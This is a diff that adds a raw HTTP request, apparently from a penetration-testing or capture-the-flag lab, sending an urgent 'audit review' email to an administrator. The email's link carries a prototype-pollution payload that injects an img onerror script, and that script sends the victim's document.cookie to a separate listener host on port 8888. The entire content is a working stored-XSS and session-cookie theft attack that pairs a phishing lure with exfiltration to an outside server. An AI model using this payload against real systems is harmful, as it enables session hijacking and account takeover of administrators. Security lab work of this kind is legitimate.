@@ -1,0 +1,6 @@
+POST /api/mail/send HTTP/1.1
+Host: 10.0.31.37:3000
+Content-Type: application/json
+Cookie: user=pentester
+
+{"to":"admin@hacksmarter.local","subject":"Audit review needed","body":"Please review this audit link urgently: http://10.0.31.37:3000/dashboard#__proto__.renderCallback=<img src=x onerror="this.src='http://10.200.78.90:8888/cookie?c='+encodeURIComponent(document.cookie)">"}
